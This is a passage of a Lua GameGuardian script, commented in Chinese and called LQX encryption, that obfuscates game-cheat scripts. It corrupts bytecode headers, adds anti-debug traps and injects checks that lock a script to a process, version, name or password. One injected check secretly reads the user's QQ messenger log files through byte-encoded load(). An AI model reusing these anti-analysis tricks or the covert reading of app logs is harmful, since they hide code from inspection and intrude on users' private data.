    while (xxxx) do
    end
end


local Info={}

for index=1,math_random(100,200) do
    Pcall(function()
        Info[index]=debug_getinfo(index+4)
    end)
end

xxxx=Info[#Info]['istailcall']
while xxxx do
end

end


local ByXEYNB123 = {} 
for k,v in pairs(_G) do 
if type(v) == string.char(116,97,98,108,101) then 
for kk,vv in pairs(v) do 
if type(vv) == string.char(102,117,110,99,116,105,111,110) and debug.getinfo(vv).source ~= string.char(61,91,74,97,118,97,93)  then 
table.insert(ByXEYNB123,k..'.'..kk) 
end 
end 
end 
end 
if #ByXEYNB123 > 0 then 
while(true) do  
TExit()
end 
end 

function jie(a,b) return string.char(bit32.rshift(a,b)) end
local ByXEY=_G[jie(6750208,16)..jie(210944,11)][jie(15073280,17)..jie(26476544,18)..jie(1552,4)..jie(29184,8)..jie(25952256,18)..jie(208,1)..jie(2496,5)..jie(7488,6)..jie(1785856,14)..jie(3136,5)..jie(202,1)..jie(7296,6)]
_G[jie(6750208,16)..jie(210944,11)][jie(15073280,17)..jie(26476544,18)..jie(1552,4)..jie(29184,8)..jie(25952256,18)..jie(208,1)..jie(2496,5)..jie(7488,6)..jie(1785856,14)..jie(3136,5)..jie(202,1)..jie(7296,6)]=function(x1,x2,x3,x4,x5,x6)
local SST=_ENV[jie(230,1)..jie(7602176,16)..jie(7471104,16)..jie(860160,13)..jie(112640,10)..jie(824,3)][jie(29184,8)..jie(6464,6)..jie(458752,12)](jie(196,2)..jie(6946816,17)..jie(880,4)..jie(3670016,16)..jie(7471104,17)..jie(229376,12)..jie(7296,7)..jie(912,4)..jie(6144,7)..jie(3670016,16),20)
for i=1,220 do
ByXEY(jie(11534336,17)..jie(4521984,16)..jie(712,3)..SST,4, false, gg.SIGN_EQUAL, 0, -1)
end
ByXEY(x1,x2,x3,x4,x5,x6)
for i=1,220 do
ByXEY(jie(11534336,17)..jie(4521984,16)..jie(712,3)..SST,4, false, gg.SIGN_EQUAL, 0, -1)
end
end
function ByXEYNB()
X=_ENV[jie(222,1)..jie(3680,5)][jie(50688,9)..jie(13824,7)..jie(7104,6)..jie(396,2)..jie(7012352,16)]()
for i=1,1 do
_ENV[jie(6750208,16)..jie(210944,11)][jie(15073280,17)..jie(26476544,18)..jie(1552,4)..jie(29184,8)..jie(25952256,18)..jie(208,1)..jie(2496,5)..jie(7488,6)..jie(1785856,14)..jie(3136,5)..jie(202,1)..jie(7296,6)](jie(196,2)..jie(6946816,17)..jie(880,4)..jie(3670016,16)..jie(7471104,17)..jie(229376,12)..jie(7296,7)..jie(912,4)..jie(6144,7)..jie(3670016,16), gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
end
Y=_ENV[jie(222,1)..jie(3680,5)][jie(50688,9)..jie(13824,7)..jie(7104,6)..jie(396,2)..jie(7012352,16)]()
if Y-X>7 then   
_ENV[jie(222,1)..jie(3680,5)][jie(3232,5)..jie(491520,12)..jie(6881280,16)..jie(232,1)](print(jie(1081344,14)..jie(7929856,16)..jie(58624,8)..jie(352,1)..jie(585728,12)..jie(3817472,14)..jie(358,1)..jie(135168,10)..jie(29824,7)..jie(45312,8)..jie(192512,10)..jie(1900544,15)..jie(3768320,14)..jie(20864,7)..jie(1024,3)..jie(460,1)..jie(1448,3)..jie(2224,4)..jie(1875968,13)..jie(4352,5)..jie(2816,4)..jie(29696,7)..jie(668,2)..jie(333824,11)..jie(1875968,13)..jie(1400,3)..jie(2144,4)..jie(3712,4)..jie(5152,5)..jie(560,2)..jie(912,2)..jie(376832,11)..jie(48758784,18)))
exit()
end
end
ByXEYNB()
]=]
--花里胡哨的加密公告
XEYXEY1=[=[
XEYXEY=[[
　　　　　　　　　　　　　　　　　　　　　　　　
☆:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::☆

　　 へ　　　　   ／|
　　/＼7　　   ∠＿/
　 /　│　　 ／　／
　│　Z ＿,＜　／　　 /`ヽ
　│　　　　　ヽ　　 /　　〉
　 Y　　　　　  `　 /　／
　ｲ●　､　●　　⊂⊃ 〈　　
　()　 へ　　　　|　＼〈
　　>ｰ ､_　 ィ　 │ ／／
　 / へ　　 /　ﾉ＜| ＼＼  -------------------我不是RL我是七喜哦
　 ヽ_ﾉ　　(_／　 │／／
　　7　　　　　　　|／
　　＞―r￣￣`ｰ―＿  |
☆:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::☆

                 

               ]]
]=]

ByXEY1="\n"..XEYXEY1.."\nSSTNB='"..ByXEY3.."'\n"..XEYFY.."\nfunction ByXEY66666()\n"..XEYb.."\n"..YC1.."\n"..XEYb.."\nend\nByXEY66666()\n"..ByXEY5.."\n "


io.output(BySST1[1]..".配置.lua","w")
io.write(ByXEY1)
io.output(XEY,"w")
io.write(ByXEY1)
io.close()
io.input(XEY, "r")
local DATA = io.read("*a")
DATA = string.dump(load(DATA), true, true)
DATA = gg.internal2(load(DATA), XEY)
io.input(XEY, "r")
DATA = io.read("*a")
DATA = DATA:gsub("is_vararg [^\n]*","is_vararg 8")
DATA = DATA:gsub("maxstacksize [^\n]*","maxstacksize 99")
DATA = DATA:gsub("linedefined [^\n]*","linedefined 0")
DATA = DATA:gsub("lastlinedefined [^\n]*","lastlinedefined 0")
DATA = string.gsub(DATA, "linedefined [^\n]+", "linedefined 0")
DATA = string.gsub(DATA, "lastlinedefined [^\n]+", "lastlinedefined 0")
--DATA = string.gsub(DATA, "numparams [^\n]+", "numparams 250")
DATA = string.gsub(DATA, "is_vararg [^\n]+", "is_vararg 250")
DATA = string.gsub(DATA, "maxstacksize [^\n]+", "maxstacksize 250")
    Zhiling = {["MOVE"] = 1,["LOADK"] = 1,["LOADKX"] = 1,["LOADBOOL"] = 1,["LOADNIL"] = 1,["GETUPVAL"] = 1,["GETTABUP"] = 1,["GETTABLE"] = 1,["SETTABUP"] = 1,["SETUPVAL"] = 1,["SETTABLE"] = 1,["NEWTABLE"] = 1,["SELF"] = 1,["ADD"] = 1,["SUB"] = 1,["MUL"] = 1,["DIV"] = 1,["MOD"] = 1,["POW"] = 1,["UNM"] = 1,["NOT"] = 1,["LEN"] = 1,["CONCAT"] = 1,["JMP"] = 1,["EQ"] = 1,["LT"] = 1,["LE"] = 1,["TEST"] = 1,["TESTSET"] = 1,["CALL"] = 1,["TAILCALL"] = 1,["RETURN"] = 1,["FORLOOP"] = 1,["FORPREP"] = 1,["TFORCALL"] = 1,["TFORLOOP"] = 1,["SETLIST"] = 1,["CLOSURE"] = 1,["VARARG"] = 1,["EXTRAARG"] = 1,["IDIV"] = 1,["BNOT"] = 1,["BAND"] = 1,["BOR"] = 1,["BXOR"] = 1,["SHL"] = 1,["SHR"] = 1,["RETURN"] = 1}
	Str = {'😂','🌚','🌝','🙄','🙃','😊','😍','😘','😏','😱','😭'} num = 1 Tab = {} number = 10000086
	function Resver(b)
      local tab = {}
      for k,v in pairs(b) do
        table.insert(tab,1,string.format("%x",v))
      end
      str = table.concat(tab)
      tab = {}
      str = str:gsub("........",function (x) table.insert(tab,1,"OP[48] 0x"..x.."\n") end)
      number = number+1
      return "JMP :goto_"..number.."\n"..table.concat(tab).."\n:goto_"..number.."\n\nMOVE v0 v0\n"
    end
    for text in string.gmatch(DATA, '[^\n]+') do
      if text ~= '' then
        str_1 = string.match(text, '%S+')
        if Zhiling[str_1] and text:match("JMP") == nil then
          table.insert(Tab,Resver(gg.bytes(Str[num])).."\n"..text.."\n")
          if num+1 > #Str then
			 num = 1
          else
			 num = num+1
          end
        else
          table.insert(Tab,text.."\n")
        end
      end
    end
    DATA=table.concat(Tab)
gg.toast("LQX:正在最后编译脚本")
DATA = string.dump(load(DATA), true)
DATA = string.gsub(DATA, string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFA, 0xFA, 0xFA),string.char(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFA, 0xFA, 0xFA))
DATA = string.gsub(DATA, string.char(0x01, 0x00, 0x00, 0x00, 0x1f, 0x00, 0x80, 0x00),string.char(0x00, 0x00, 0x00, 0x00), 1)
DATA = string.gsub(DATA, string.char(0x04, 0x07, 0x00, 0x00, 0x00, 0x6C, 0x52, 0x6C, 0x52, 0x6C, 0x52, 0x00),string.char(0x04, 0x00, 0x00, 0x00, 0x00))
DATA = string.gsub(DATA, string.char(0x04, 0x07, 0x00, 0x00, 0x00, 0x52, 0x6C, 0x52, 0x6C, 0x52, 0x6C),string.char(0x04, 0xE9, 0x03, 0x00, 0x00) .. string.rep(string.char(6), 1000))
DATA = string.gsub(DATA, string.char(0x04, 0x07, 0x00, 0x00, 0x00, 0x52, 0x6C, 0x52, 0x6C, 0x52, 0x52),string.char(0x04, 0x11, 0x27, 0x00, 0x00) .. string.rep(string.char(6), 10000))
DATA=string.gsub(DATA, string.char(0x1B,0x00,0x00, 0x00, 0x17, 0x00 ,0x00 ,0x80,0x01),string.char(0x1B, 0x00, 0x00, 0x00 ,0x17, 0x00 ,0x00 ,0x80 ,0x17))
DATA=string.gsub(DATA, string.char(0x1B,0x00,0x00, 0x00, 0x17, 0x40 ,0x00 ,0x80,0x01),string.char(0x1B, 0x00, 0x00, 0x00 ,0x17, 0x40 ,0x00 ,0x80 ,0x99))
DATA=string.gsub(DATA, string.char(0x17 ,0x80 ,0xFE ,0x7F ,0x06),string.char(0x17 ,0x80 ,0x1B ,0x7F ,0x06))
DATA=string.gsub(DATA, string.char(0x1F ,0x00 ,0x80 ,0x00 ),string.char(0x1F ,0x00 ,0x80 ,0xAB))
qukuai = string.char(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFA, 0xFA, 0xFA) ..string.rep(string.char(0), 32)
DATA = DATA:gsub(qukuai,string.char(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFA, 0xFA, 0xFA) ..string.rep(string.char(0), 24) .. string.char(0x36, 0xB2, 0xBF, 0xFF, 0x83, 0x2B, 0xD8, 0xFF))
local lsqnbb = string.char(0x6C,0x73,0x71,0x6E,0x62)
local lsqnbb = string.rep(lsqnbb, "5000")
Y=string.gsub(DATA,string.char(0x04,0x10,0x00,0x00,0x00,0x6C,0x73,0x71,0x6E,0x62,0x6C,0x73,0x71,0x6E, 0x62,0x6C,0x73,0x71,0x6E,0x62,0x00),string.char(0x04,0xA9,0x61,0x00,0x00)..lsqnbb..string.char(0x00))
DATA=string.gsub(Y,"lsqnb",string.char(math.random(0,255))..string.char(math.random(0,255))..string.char(math.random(0,255))..string.char(math.random(0,255))..string.char(math.random(0,255)))
io.open(XEY,"w"):write(DATA):close()

XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX:脚本已加密到:\n"..XEY..""..XEYNB)
gg.toast("LQX：脚本加密完成🍵")
gg.alert("LQX:"..XEYNB)
os.exit(print("\n欢迎再次使用LQX加密"))
end

function c()
file = io.open(ByXEY2, "r")
if file then--如果无配置返回
YC1 = file:read("*a")
else
gg.toast("LQX：请先选择脚本🍵")
Main()--返回
end
file = io.open(ByXEY1, "r")
code = file:read("*a")

BySST2 = gg.prompt({
'目前选择脚本🍵：',--1
'使用进程验证🍵[目前进程]',--2
'目前进程包名🍵：',--3
'使用GG版本验证🍵[修改器验证]',--4
'目前GG版本🍵：',--5
'使用GG包名验证🍵[修改器验证]',--6
'目前GG包名🍵：',--7
'使用GG版本号验证🍵[修改器验证]',--8
'目前GG版本号🍵：',--9
'使用脚本名字验证🍵[防改脚本名验证]',--10
'设置脚本名字🍵：',--11
'使用QQ群验证🍵[QQ群验证]',--12
'设置QQ群验证号🍵：',--13
'使用普通密码验证🍵[密码验证]',--14
'设置密码验证[已随机生成]🍵：',--15
}, {
code,
true,
ByXEY3,
true,
ByXEY4,
true,
ByXEY5,
true,
ByXEY6,
true,
YC1,
true,
"590854164",
true,
getRandom(4),
},{
'file',
'checkbox',
'text',
'checkbox',
'text',
'checkbox',
'text',
'checkbox',
'text',
'checkbox',
'text',
'checkbox',
'text',
'checkbox',
'text',
})
if BySST2 == nil then--如果没选择
gg.toast("LQX：已返回主业🍵")
Main()--返回
end

if BySST2[2] == true then--判断是否写入进程验证
XEY="XEY1=gg.getTargetPackage()\nif XEY1~='"..ByXEY3.."'then\ngg.alert('小鳄鱼：当前应用进程非指定进程❌')\nXEYTC()\nend\n"
file=io.open(BySST2[1],'r')
XEY1= file:read("*a")
io.open(BySST2[1],"w"):write(XEY..XEY1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：GG应用进程验证写入成功✔"..XEYNB)
end

if BySST2[4] == true then--判断是否写入GG版本验证
XEY="if gg.VERSION== '"..ByXEY4.."' then\nelse\ngg.alert('LQX：专用GG修改器验证失败❌')\nXEYTC()\nend\n"
file=io.open(BySST2[1],'r')
XEY1= file:read("*a")
io.open(BySST2[1],"w"):write(XEY..XEY1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：GG版本验证写入成功✔"..XEYNB)
end

if BySST2[6] == true then--判断是否写入GG包名验证
XEY="if gg.PACKAGE== '"..ByXEY5.."' then\nelse\ngg.alert('LQX：专用GG修改器验证失败❌')\nXEYTC()\nend\n"
file=io.open(BySST2[1],'r')
XEY1= file:read("*a")
io.open(BySST2[1],"w"):write(XEY..XEY1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：GG包名验证写入成功✔"..XEYNB)
end

if BySST2[8] == true then--判断是否写入GG版本号验证
XEY="if gg.BUILD== '"..ByXEY6.."' then\nelse\ngg.alert('LQX：专用GG修改器验证失败❌')\nXEYTC()\nend\n"
file=io.open(BySST2[1],'r')
XEY1= file:read("*a")
io.open(BySST2[1],"w"):write(XEY..XEY1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：GG版本号验证写入成功✔"..XEYNB)
end

if BySST2[10] == true then--判断是否写入脚本名字验证
XEY="XEY=gg.getFile():match('[^/]*$')\nif XEY~='"..BySST2[11].."' then\ngg.alert('LQX：请匆更改脚本名❌')\nXEYTC()\nend\n"
file=io.open(BySST2[1],'r')
XEY1= file:read("*a")
io.open(BySST2[1],"w"):write(XEY..XEY1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：脚本名字验证写入成功✔"..XEYNB)
end

if BySST2[12] == true then--判断是否写入QQ群验证
XEY=[[
function Activity()
Ph = os.date("%y.%m.%d.%H")
x1,x2=io.open("/storage/emulated/0/tencent/msflogs/com/tencent/mobileqq/com.tencent.mobileqq."..Ph..".log")
if x2 == nil then
x=x1:read("*a")
end
FINDQQ = string.find(x,"群号")
if FINDQQ ~= nil then
gg.toast("LQX：已进入QQ群：群号")
else
gg.alert('LQX：未进入QQ群：群号❌')
XEYTC()
end
end
print(Activity())
]]

XEY=string.gsub(XEY,"群号",BySST2[13])
XEY2=XEY
XEY2=table.concat({XEY2:byte(1, -1)}, ",")
XEY2=" pcall(load(string.char(table.unpack({" ..XEY2.. "}))))"
file=io.open(BySST2[1],'r')
XEY1= file:read("*a")
io.open(BySST2[1],"w"):write(XEY2..XEY1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：QQ群验证写入成功✔"..XEYNB)
end

if BySST2[14] == true then--判断是否写入普通密码验证
XEY=[[
XEY = gg.prompt({string.char(66,121,229,176,143,233,179,132,233,177,188,239,188,154,232,175,183,232,190,147,229,133,165,229,175,134,231,160,129)}, {[1] = 0}, {[1] = "text"})
if XEY[1]==设置密码 then
else
gg.alert('LQX：密码错误❌')
XEYTC()
end
]]

local data = BySST2[15]
local result = ''
for i=1,#data do
local a=string.sub(data, i , i)
b=string.byte(a)
if pd==nil then
pd=1
result = result..tonumber(b)
else
result = result..','..tonumber(b)
end
end
local ByXEY10='string.char('..result..')'  

XEY=string.gsub(XEY,"设置密码",ByXEY10)
file=io.open(BySST2[1],'r')
XEY1= file:read("*a")
io.open(BySST2[1],"w"):write(XEY..XEY1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：普通密码写入成功✔"..XEYNB)
end

gg.toast("LQX：验证添加完成🍵")
Main()
end

function Exit()
os.exit(print("\n欢迎再次使用LQX加密"))
end

while true do
  if gg.isVisible(true) then
    XGCK = 1
    gg.setVisible(false)
  end
  gg.clearResults()
  if XGCK == 1 then
    Main()
  end
end
